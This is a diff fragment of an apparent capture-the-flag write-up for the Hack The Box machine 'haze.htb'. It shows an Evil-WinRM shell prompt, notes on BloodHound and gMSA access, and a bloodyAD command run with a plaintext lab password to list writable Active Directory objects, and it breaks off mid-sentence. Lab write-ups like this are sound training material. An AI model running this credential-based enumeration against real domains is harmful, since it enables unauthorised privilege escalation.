@@ -427,7 +427,9 @@ Info: Download successful!
 *Evil-WinRM* PS C:\Users\mark.adams\Desktop>
 ```
 
-So after looking arou
+So after looking around on bloodhound i see no outbound object control that tells me i can get the GMSA
+
+Ill try using bloodyAD to see if there is something i have to do first:
 
 ```python
 bloodyAD -d haze.htb --host dc01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' get writable 
@@ -447,4 +449,4 @@ permission: CREATE_CHILD
 distinguishedName: DC=_msdcs.haze.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=haze,DC=htb
 permission: CREATE_CHILD
 ```
-
+So i have write access on this, so i should be able to add the wrigh
